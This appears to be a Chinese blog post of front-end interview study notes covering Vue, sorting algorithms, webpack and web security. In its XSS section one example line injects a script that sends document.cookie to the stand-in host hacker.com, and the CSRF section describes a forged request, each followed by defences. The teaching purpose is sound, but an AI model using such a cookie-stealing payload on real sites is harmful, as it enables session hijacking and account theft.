---
title: 前端面试必考篇—VUE、算法、webpack
date: 2018-07-11 18:28:02
tags:
---
1.  （必考）Vue 有哪些生命周期钩子函数？
    *   看文档：[https://cn.vuejs.org/v2/api/#选项-生命周期钩子8](https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90)
2.  （必考）Vue 如何实现组件通信？
    1.  父子通信（使用 Prop 传递数据、使用 v-on 绑定自定义事件）
    2.  爷孙通信（通过两对父子通信，爷爸之间父子通信，爸儿之间父子通信）
    3.  [兄弟通信（new Vue() 作为 eventBus）1](https://cn.vuejs.org/v2/guide/components.html#%E9%9D%9E%E7%88%B6%E5%AD%90%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1)
3.  Vuex 的作用是什么？
    *   看文档、博客 [https://vuex.vuejs.org/zh-cn/intro.html3](https://vuex.vuejs.org/zh-cn/intro.html)
4.  VueRouter 路由是什么？
    *   看文档、博客
5.  Vue 的双向绑定是如何实现的？有什么缺点？
    *   看文档，[深入响应式原理6](https://cn.vuejs.org/v2/guide/reactivity.html)
6.  Computed 计算属性的用法？跟 Methods 的区别。 [https://zhuanlan.zhihu.com/p/337785944](https://zhuanlan.zhihu.com/p/33778594)

## [](https://github.com/Jsmond2016/blog/blob/master/%E5%B7%B2%E5%AE%8C%E6%88%90/%E9%9D%A2%E8%AF%95%E7%BB%BC%E5%90%88/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%BF%85%E8%80%83%E9%A2%98.md#%E7%AE%97%E6%B3%95)算法

1.  排序算法（背诵冒泡排序、选择排序、计数排序、快速排序、插入排序、归并排序）
2.  二分查找法
3.  翻转二叉树

把上面三个背一下，算法题必过。

安全押题

1.  什么是 XSS 攻击？如何预防？

    *   举例

        ```
        div.innerHTML = userComment  // userComment 内容是 <script>$.get('http://hacker.com?cookie='+document.cookie)</script>
        // 恶意就被执行了，这就是 XSS

        ```

    *   预防

        1.  不要使用 innerHTML，改成 innerText，script 就会被当成文本，不执行
        2.  如果你一样要用 innerHTML，字符过滤
            *   把 < 替换成 `&lt;`
            *   把 > 替换成 `&gt;`
            *   把 & 替换成 `&amp;`
            *   把 ’ 替换成 `&#39;`
            *   把 ’ 替换成 `&quot;`
            *   代码 div.innerHTML = userComment.replace(/>/g, ‘`&lt;`’).replace…
        3.  使用 CSP Content Security Policy
2.  什么是 CSRF 攻击？如何预防？

    *   过程
        1.  用户在 [qq.com](http://qq.com/) 登录
        2.  用户切换到 [hacker.com](http://hacker.com/)（恶意网站）
        3.  [hacker.com](http://hacker.com/) 发送一个 [qq.com/add_friend](http://qq.com/add_friend) 请求，让当前用户添加 hacker 为好友。
        4.  用户在不知不觉中添加 hacker 为好友。
        5.  用户没有想发这个请求，但是 hacker 伪造了用户发请求的假象。
    *   避免
        1.  检查 referer，[qq.com](http://qq.com/) 可以拒绝来自 [hacker.com](http://hacker.com/) 的请求
        2.  csrf_token 来解决

## [](https://github.com/Jsmond2016/blog/blob/master/%E5%B7%B2%E5%AE%8C%E6%88%90/%E9%9D%A2%E8%AF%95%E7%BB%BC%E5%90%88/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%BF%85%E8%80%83%E9%A2%98.md#webpack)Webpack

1.  转译出的文件过大怎么办？
    *   使用 code split
    *   写法 import(‘xxx’).then(xxx=>{console.log(xxx)})
    *   xxx 模块就是按需加载的
2.  转译速度慢什么办？
    *   方方不会。
3.  写过 webpack loader 吗？
    *   [http://www.alloyteam.com/2016/01/webpack-loader-1/4](http://www.alloyteam.com/2016/01/webpack-loader-1/)

## [](https://github.com/Jsmond2016/blog/blob/master/%E5%B7%B2%E5%AE%8C%E6%88%90/%E9%9D%A2%E8%AF%95%E7%BB%BC%E5%90%88/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E5%BF%85%E8%80%83%E9%A2%98.md#%E5%8F%91%E6%95%A3%E9%A2%98)

